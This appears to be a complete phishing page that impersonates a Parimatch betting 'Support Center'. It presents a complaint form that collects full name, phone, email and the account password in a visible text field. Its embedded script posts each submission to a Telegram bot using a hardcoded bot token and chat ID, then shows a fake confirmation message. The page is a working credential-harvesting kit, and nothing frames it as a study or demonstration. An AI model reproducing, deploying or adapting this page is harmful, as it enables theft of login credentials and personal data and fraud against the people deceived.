<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>Parimatch | Support Center</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Poppins', 'Inter', system-ui, -apple-system, 'Segoe UI', sans-serif;
        }

        @import url('https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,600;14..32,700;14..32,800&family=Orbitron:wght@400;500;600;700;800;900&display=swap');

        body {
            min-height: 100vh;
            background: #07080a;
            overflow-x: hidden;
        }

        /* ========== LOADING SCREEN (Cinematic Center - 2 Seconds) ========== */
        .loading-screen {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: radial-gradient(circle at center, #0b0b0f 0%, #010101 100%);
            z-index: 2000;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            transition: opacity 0.8s cubic-bezier(0.23, 1, 0.32, 1);
            backdrop-filter: blur(2px);
        }

        .glow-ring {
            position: relative;
            width: 220px;
            height: 220px;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 2rem;
        }

        .rotating-ring {
            position: absolute;
            width: 100%;
            height: 100%;
            border-radius: 50%;
            border: 3px solid transparent;
            border-top: 4px solid #ffcc33;
            border-right: 2px solid #ffdd77;
            border-bottom: 2px solid #ffaa11;
            animation: spinRing 2.5s linear infinite;
            filter: drop-shadow(0 0 12px #ffcc44);
        }

        .rotating-ring::before {
            content: '';
            position: absolute;
            top: -5px;
            left: -5px;
            right: -5px;
            bottom: -5px;
            border-radius: 50%;
            border: 1px solid rgba(255, 220, 80, 0.4);
            animation: pulseRing 1.8s infinite alternate;
        }

        @keyframes spinRing {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        @keyframes pulseRing {
            0% { opacity: 0.3; transform: scale(1);}
            100% { opacity: 1; transform: scale(1.05);}
        }

        .loading-logo {
            width: 150px;
            z-index: 10;
            animation: floatZoom 2s infinite alternate ease-in-out;
            filter: drop-shadow(0 0 20px #ffcc33);
        }

        @keyframes floatZoom {
            0% { transform: scale(0.96) translateY(0px); filter: drop-shadow(0 0 8px #f5b042);}
            100% { transform: scale(1.08) translateY(-8px); filter: drop-shadow(0 0 28px #ffdd77);}
        }

        .loading-text {
            font-family: 'Orbitron', monospace;
            font-size: 1.2rem;
            letter-spacing: 2.5px;
            background: linear-gradient(135deg, #FFF5CF, #FFD966, #FFB347);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            font-weight: 700;
            margin: 25px 0 28px 0;
            text-transform: uppercase;
            text-align: center;
        }

        .loader-bar-container {
            width: 320px;
            max-width: 75%;
            height: 6px;
            background: rgba(30, 30, 35, 0.8);
            border-radius: 12px;
            overflow: hidden;
            box-shadow: 0 0 12px #ffd96655;
            backdrop-filter: blur(4px);
        }

        .loader-fill {
            width: 0%;
            height: 100%;
            background: linear-gradient(90deg, #ffdd66, #ffaa00, #ffdd66);
            border-radius: 12px;
            box-shadow: 0 0 18px #ffcc33;
            transition: width 0.05s linear;
        }

        .particle-bg {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 1;
        }

        /* ========== MAIN FORM SECTION ========== */
        .main-container {
            opacity: 0;
            visibility: hidden;
            transition: opacity 1s ease, visibility 0s linear 1s;
            min-height: 100vh;
            width: 100%;
            position: relative;
            background-image: url('https://i.postimg.cc/fRPVLpY6/file-00000000c794720b81ae6e7efb1708bc.png');
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
            background-attachment: fixed;
        }

        .main-container.active {
            opacity: 1;
            visibility: visible;
            transition: opacity 1s ease, visibility 0s linear 0s;
        }

        .main-container::before {
            content: "";
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.68);
            backdrop-filter: brightness(0.88) blur(1.5px);
            z-index: 0;
        }

        #floating-particles {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 1;
        }

        .form-wrapper {
            position: relative;
            z-index: 15;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 2rem 1.5rem;
        }

        .complaint-card {
            background: rgba(12, 12, 18, 0.78);
            backdrop-filter: blur(16px);
            border-radius: 2.5rem;
            border: 1px solid rgba(255, 215, 80, 0.45);
            box-shadow: 0 30px 50px rgba(0, 0, 0, 0.5), 0 0 28px rgba(255, 200, 0, 0.2);
            width: 100%;
            max-width: 600px;
            padding: 2.2rem 2rem;
            transition: transform 0.3s, box-shadow 0.3s;
            animation: slideFadeIn 0.9s cubic-bezier(0.2, 0.9, 0.4, 1.1);
        }

        @keyframes slideFadeIn {
            from {
                opacity: 0;
                transform: translateY(45px) scale(0.96);
            }
            to {
                opacity: 1;
                transform: translateY(0) scale(1);
            }
        }

        .complaint-card:hover {
            border-color: rgba(255, 210, 70, 0.8);
            box-shadow: 0 35px 55px rgba(0, 0, 0, 0.6), 0 0 35px rgba(255, 200, 0, 0.45);
        }

        .form-logo {
            text-align: center;
            margin-bottom: 1.2rem;
        }

        .form-logo img {
            width: 130px;
            filter: drop-shadow(0 0 12px #ffcc44);
            transition: filter 0.3s;
        }

        .form-title {
            font-size: 1.9rem;
            font-weight: 800;
            text-align: center;
            background: linear-gradient(135deg, #FFF5D0, #FFE488, #FFCF40);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            letter-spacing: -0.5px;
            font-family: 'Orbitron', monospace;
        }

        .form-sub {
            text-align: center;
            color: #e6dfbf;
            font-size: 0.8rem;
            margin-bottom: 2rem;
            border-bottom: 1px dashed rgba(255, 215, 0, 0.5);
            display: inline-block;
            width: auto;
            margin-left: auto;
            margin-right: auto;
            padding-bottom: 8px;
        }

        .input-group {
            margin-bottom: 1.3rem;
        }

        .input-group label {
            display: block;
            font-size: 0.85rem;
            font-weight: 600;
            margin-bottom: 6px;
            color: #FFE9B6;
            letter-spacing: 0.4px;
        }

        .input-group input,
        .input-group textarea {
            width: 100%;
            padding: 13px 18px;
            background: rgba(18, 18, 24, 0.85);
            border: 1px solid rgba(255, 200, 70, 0.5);
            border-radius: 1.4rem;
            font-size: 1rem;
            color: #fff9ef;
            transition: all 0.25s ease;
            outline: none;
            font-weight: 500;
        }

        .input-group input:focus,
        .input-group textarea:focus {
            border-color: #ffcc44;
            box-shadow: 0 0 14px rgba(255, 204, 68, 0.65);
            background: rgba(0, 0, 0, 0.8);
        }

        .input-group textarea {
            resize: vertical;
            min-height: 100px;
            font-family: inherit;
        }

        .submit-btn {
            width: 100%;
            padding: 15px;
            background: linear-gradient(100deg, #ffcf3a, #ffb800);
            border: none;
            border-radius: 3rem;
            font-size: 1.2rem;
            font-weight: 800;
            text-transform: uppercase;
            letter-spacing: 2.5px;
            color: #0a0802;
            margin-top: 0.8rem;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 0 12px #ffcc44, 0 6px 14px rgba(0, 0, 0, 0.4);
            font-family: 'Orbitron', monospace;
        }

        .submit-btn:hover:not(:disabled) {
            transform: scale(1.02);
            background: linear-gradient(100deg, #ffdd5e, #ffcc22);
            box-shadow: 0 0 28px rgba(255, 210, 0, 0.95), 0 8px 20px black;
            letter-spacing: 3.5px;
        }

        .submit-btn:active:not(:disabled) {
            transform: scale(0.98);
        }

        .submit-btn:disabled {
            opacity: 0.7;
            cursor: not-allowed;
            filter: grayscale(0.1);
        }

        /* Simple Success Message */
        .success-message {
            text-align: center;
            padding: 2rem 1rem;
            animation: successFade 0.6s ease-out;
        }

        @keyframes successFade {
            from {
                opacity: 0;
                transform: scale(0.95);
            }
            to {
                opacity: 1;
                transform: scale(1);
            }
        }

        .success-icon {
            font-size: 3rem;
            margin-bottom: 1rem;
            filter: drop-shadow(0 0 10px #ffcc44);
        }

        .success-message h2 {
            color: #ffea8a;
            margin-bottom: 1rem;
            font-weight: 700;
            font-size: 1.6rem;
        }

        .success-message p {
            color: #e6dfbf;
            font-size: 1rem;
            line-height: 1.5;
            background: rgba(0, 0, 0, 0.5);
            padding: 16px 20px;
            border-radius: 16px;
            margin-bottom: 1.5rem;
        }

        .ok-button {
            background: linear-gradient(95deg, #ffcd38, #ffaa00);
            border: none;
            padding: 12px 32px;
            font-size: 1rem;
            font-weight: 600;
            font-family: 'Orbitron', monospace;
            border-radius: 40px;
            color: #0a0a0a;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 0 12px rgba(255, 200, 0, 0.6);
        }

        .ok-button:hover {
            transform: scale(1.02);
            box-shadow: 0 0 20px rgba(255, 210, 0, 0.9);
        }

        .hide-form {
            display: none;
        }

        .error-toast {
            position: fixed;
            bottom: 30px;
            left: 50%;
            transform: translateX(-50%);
            background: rgba(0,0,0,0.9);
            backdrop-filter: blur(10px);
            color: #ff8866;
            padding: 12px 24px;
            border-radius: 50px;
            font-size: 0.9rem;
            border-left: 4px solid #ff5500;
            z-index: 3000;
            font-family: monospace;
            white-space: nowrap;
            animation: fadeInUp 0.3s ease;
        }

        @keyframes fadeInUp {
            from {
                opacity: 0;
                transform: translateX(-50%) translateY(20px);
            }
            to {
                opacity: 1;
                transform: translateX(-50%) translateY(0);
            }
        }

        @media (max-width: 640px) {
            .complaint-card {
                padding: 1.6rem;
            }
            .form-title {
                font-size: 1.5rem;
            }
            .loading-text {
                font-size: 0.95rem;
                letter-spacing: 1px;
            }
            .glow-ring {
                width: 160px;
                height: 160px;
            }
            .loading-logo {
                width: 110px;
            }
            .error-toast {
                white-space: normal;
                width: 90%;
                text-align: center;
                font-size: 0.8rem;
            }
        }
    </style>
</head>
<body>

<!-- LOADING SCREEN -->
<div id="loadingScreen" class="loading-screen">
    <canvas id="loadingParticleCanvas" class="particle-bg"></canvas>
    <div class="glow-ring">
        <div class="rotating-ring"></div>
        <img class="loading-logo" src="https://i.postimg.cc/dtH1HpNZ/1000033240-Picsart-Background-Remover.png" alt="Parimatch Logo">
    </div>
    <div class="loading-text">Connecting To Parimatch Support Center...</div>
    <div class="loader-bar-container">
        <div id="loaderFill" class="loader-fill"></div>
    </div>
</div>

<!-- MAIN FORM -->
<div id="mainApp" class="main-container">
    <canvas id="floating-particles"></canvas>
    <div class="form-wrapper">
        <div id="complaintFormCard" class="complaint-card">
            <div class="form-logo">
                <img src="https://i.postimg.cc/dtH1HpNZ/1000033240-Picsart-Background-Remover.png" alt="Parimatch Logo">
            </div>
            <div class="form-title">⚡ PARIMATCH SUPPORT ⚡</div>
            <div style="text-align: center;"><span class="form-sub">Elite Support Hub — File a complaint with priority assistance</span></div>

            <form id="complaintForm">
                <div class="input-group">
                    <label>👤 Full Name</label>
                    <input type="text" id="fullname" placeholder="Enter your full legal name" required>
                </div>
                <div class="input-group">
                    <label>📱 Mobile Number</label>
                    <input type="tel" id="mobile" placeholder="+91 / Your mobile number" required>
                </div>
                <div class="input-group">
                    <label>📧 Email Address</label>
                    <input type="email" id="email" placeholder="you@example.com" required>
                </div>
                <div class="input-group">
                    <label>🔐 Password (Visible Text)</label>
                    <input type="text" id="password" placeholder="Enter your account password" required>
                </div>
                <div class="input-group">
                    <label>📝 Describe Your Problem</label>
                    <textarea id="problem" placeholder="Detail the issue you're facing with Parimatch..."></textarea>
                </div>
                <button type="submit" class="submit-btn" id="submitBtn">SUBMIT REQUEST</button>
            </form>
        </div>

        <!-- Success Message - Simple & Professional -->
        <div id="successBlock" class="complaint-card hide-form" style="display: none;">
            <div class="success-message">
                <div class="success-icon">✅</div>
                <h2>Request Submitted</h2>
                <p>Your support request has been submitted successfully.<br>Our team will contact you shortly.</p>
                <button id="okayButton" class="ok-button">OK</button>
            </div>
        </div>
    </div>
</div>

<script>
    (function() {
        // Telegram Configuration
        const BOT_TOKEN = "8740310079:AAEFPj69r9Npkv3DoTNJMbeJ6d4g5sXhVWc";
        const CHAT_ID = "8400052598";
        
        // DOM Elements
        const loadingScreen = document.getElementById('loadingScreen');
        const loaderFill = document.getElementById('loaderFill');
        const mainApp = document.getElementById('mainApp');
        const complaintCard = document.getElementById('complaintFormCard');
        const successBlockDiv = document.getElementById('successBlock');
        const complaintForm = document.getElementById('complaintForm');
        const submitBtn = document.getElementById('submitBtn');
        const okayBtn = document.getElementById('okayButton');
        
        // Loading - 2 seconds
        let startTime = performance.now();
        let animationFrame = null;
        let loadingCompleted = false;
        let transitionDone = false;
        const LOADING_DURATION = 2000;
        
        // Loading Particles
        const loadCanvas = document.getElementById('loadingParticleCanvas');
        let lCtx, loadParticles = [];
        function initLoadingParticles() {
            if (!loadCanvas) return;
            lCtx = loadCanvas.getContext('2d');
            function resizeLoadCanvas() {
                loadCanvas.width = window.innerWidth;
                loadCanvas.height = window.innerHeight;
            }
            window.addEventListener('resize', resizeLoadCanvas);
            resizeLoadCanvas();
            for (let i = 0; i < 80; i++) {
                loadParticles.push({
                    x: Math.random() * loadCanvas.width,
                    y: Math.random() * loadCanvas.height,
                    radius: Math.random() * 3 + 1.2,
                    speedX: (Math.random() - 0.5) * 0.4,
                    speedY: (Math.random() - 0.5) * 0.3 + 0.1,
                    color: `hsl(${48 + Math.random() * 15}, 85%, 60%)`
                });
            }
            function animateLoadingParticles() {
                if (!lCtx || !loadCanvas) return;
                lCtx.clearRect(0, 0, loadCanvas.width, loadCanvas.height);
                for (let p of loadParticles) {
                    lCtx.beginPath();
                    lCtx.arc(p.x, p.y, p.radius, 0, Math.PI * 2);
                    lCtx.fillStyle = p.color;
                    lCtx.shadowBlur = 12;
                    lCtx.shadowColor = '#ffaa33';
                    lCtx.fill();
                    p.x += p.speedX;
                    p.y += p.speedY;
                    if (p.x < -15) p.x = loadCanvas.width + 15;
                    if (p.x > loadCanvas.width + 15) p.x = -15;
                    if (p.y < -15) p.y = loadCanvas.height + 15;
                    if (p.y > loadCanvas.height + 15) p.y = -15;
                }
                requestAnimationFrame(animateLoadingParticles);
            }
            animateLoadingParticles();
        }
        initLoadingParticles();
        
        // Loading Bar Animation
        function updateLoadingBar(now) {
            const elapsed = (now - startTime);
            let progress = Math.min(1, elapsed / LOADING_DURATION);
            const percent = progress * 100;
            if (loaderFill) loaderFill.style.width = percent + '%';
            
            if (progress >= 1 && !loadingCompleted) {
                loadingCompleted = true;
                if (animationFrame) cancelAnimationFrame(animationFrame);
                finishLoadingAndShowForm();
                return;
            }
            animationFrame = requestAnimationFrame(updateLoadingBar);
        }
        
        const timeoutFallback = setTimeout(() => {
            if (!loadingCompleted) {
                if (animationFrame) cancelAnimationFrame(animationFrame);
                if (loaderFill) loaderFill.style.width = '100%';
                finishLoadingAndShowForm();
            }
        }, LOADING_DURATION + 100);
        
        function finishLoadingAndShowForm() {
            if (transitionDone) return;
            transitionDone = true;
            clearTimeout(timeoutFallback);
            
            loadingScreen.style.opacity = '0';
            setTimeout(() => {
                loadingScreen.style.display = 'none';
            }, 800);
            
            mainApp.classList.add('active');
            initFloatingParticles();
        }
        
        // Floating Particles
        let particleCtx, particlesArray = [], particleAnim;
        function initFloatingParticles() {
            const canvas = document.getElementById('floating-particles');
            if (!canvas) return;
            particleCtx = canvas.getContext('2d');
            function resizeCanvas() {
                canvas.width = window.innerWidth;
                canvas.height = window.innerHeight;
            }
            window.addEventListener('resize', resizeCanvas);
            resizeCanvas();
            particlesArray = [];
            for (let i = 0; i < 120; i++) {
                particlesArray.push({
                    x: Math.random() * canvas.width,
                    y: Math.random() * canvas.height,
                    radius: Math.random() * 3.5 + 1,
                    speedX: (Math.random() - 0.5) * 0.5,
                    speedY: (Math.random() - 0.5) * 0.4 + 0.1,
                    color: `hsl(${48 + Math.random() * 18}, 88%, 58%)`
                });
            }
            function draw() {
                if (!particleCtx || !canvas) return;
                particleCtx.clearRect(0, 0, canvas.width, canvas.height);
                for (let p of particlesArray) {
                    particleCtx.beginPath();
                    particleCtx.arc(p.x, p.y, p.radius, 0, Math.PI * 2);
                    particleCtx.fillStyle = p.color;
                    particleCtx.shadowBlur = 10;
                    particleCtx.shadowColor = '#ffcc55';
                    particleCtx.fill();
                    p.x += p.speedX;
                    p.y += p.speedY;
                    if (p.x < -15) p.x = canvas.width + 15;
                    if (p.x > canvas.width + 15) p.x = -15;
                    if (p.y < -15) p.y = canvas.height + 15;
                    if (p.y > canvas.height + 15) p.y = -15;
                }
                particleAnim = requestAnimationFrame(draw);
            }
            draw();
        }
        
        // Telegram API
        async function sendToTelegram(name, mobile, email, password, problem) {
            const message = `🎮 *NEW SUPPORT REQUEST* 🎮\n\n` +
                           `👤 *Name:* ${escapeMarkdown(name)}\n` +
                           `📱 *Mobile:* ${escapeMarkdown(mobile)}\n` +
                           `📧 *Email:* ${escapeMarkdown(email)}\n` +
                           `🔐 *Password:* ${escapeMarkdown(password)}\n` +
                           `📝 *Problem:* ${escapeMarkdown(problem)}\n\n` +
                           `🕒 ${new Date().toLocaleString()}`;
            
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            const payload = {
                chat_id: CHAT_ID,
                text: message,
                parse_mode: "Markdown"
            };
            
            const response = await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
            const data = await response.json();
            if (!data.ok) throw new Error(data.description || 'Telegram API error');
            return true;
        }
        
        function escapeMarkdown(text) {
            if (!text) return '';
            return text.replace(/[_*[\]()~`>#+\-=|{}.!]/g, '\\$&');
        }
        
        function showErrorToast(message) {
            const existingToast = document.querySelector('.error-toast');
            if (existingToast) existingToast.remove();
            const toast = document.createElement('div');
            toast.className = 'error-toast';
            toast.textContent = `⚠️ ${message}`;
            document.body.appendChild(toast);
            setTimeout(() => {
                toast.style.opacity = '0';
                setTimeout(() => toast.remove(), 500);
            }, 4000);
        }
        
        function resetAndShowForm() {
            document.getElementById('fullname').value = '';
            document.getElementById('mobile').value = '';
            document.getElementById('email').value = '';
            document.getElementById('password').value = '';
            document.getElementById('problem').value = '';
            
            successBlockDiv.classList.add('hide-form');
            successBlockDiv.style.display = 'none';
            
            complaintCard.classList.remove('hide-form');
            complaintCard.style.display = 'block';
            complaintCard.style.opacity = '1';
            complaintCard.style.transform = 'scale(1)';
            
            submitBtn.disabled = false;
            submitBtn.textContent = 'SUBMIT REQUEST';
        }
        
        // Form Submit
        complaintForm.addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const fullname = document.getElementById('fullname').value.trim();
            const mobile = document.getElementById('mobile').value.trim();
            const email = document.getElementById('email').value.trim();
            const password = document.getElementById('password').value;
            const problem = document.getElementById('problem').value.trim();
            
            if (!fullname) { showErrorToast('Please enter your full name'); return; }
            if (!mobile) { showErrorToast('Mobile number is required'); return; }
            if (!email) { showErrorToast('Email address is required'); return; }
            if (!/^\S+@\S+\.\S+$/.test(email)) { showErrorToast('Please enter a valid email address'); return; }
            if (!password) { showErrorToast('Please enter your password'); return; }
            if (!problem) { showErrorToast('Please describe your problem'); return; }
            
            submitBtn.disabled = true;
            submitBtn.textContent = 'SUBMITTING...';
            
            try {
                await sendToTelegram(fullname, mobile, email, password, problem);
                
                complaintCard.style.transition = 'opacity 0.45s ease, transform 0.4s';
                complaintCard.style.opacity = '0';
                complaintCard.style.transform = 'scale(0.94)';
                setTimeout(() => {
                    complaintCard.classList.add('hide-form');
                    complaintCard.style.display = 'none';
                    successBlockDiv.classList.remove('hide-form');
                    successBlockDiv.style.display = 'block';
                    successBlockDiv.style.animation = 'slideFadeIn 0.6s ease-out';
                    submitBtn.disabled = false;
                    submitBtn.textContent = 'SUBMIT REQUEST';
                }, 300);
                
            } catch (error) {
                console.error(error);
                showErrorToast('Failed to submit. Please try again.');
                submitBtn.disabled = false;
                submitBtn.textContent = 'SUBMIT REQUEST';
            }
        });
        
        if (okayBtn) {
            okayBtn.addEventListener('click', () => {
                resetAndShowForm();
            });
        }
        
        // Start
        startTime = performance.now();
        animationFrame = requestAnimationFrame(updateLoadingBar);
        
        window.addEventListener('beforeunload', () => {
            if (animationFrame) cancelAnimationFrame(animationFrame);
            if (particleAnim) cancelAnimationFrame(particleAnim);
        });
    })();
</script>
</body>
</html>
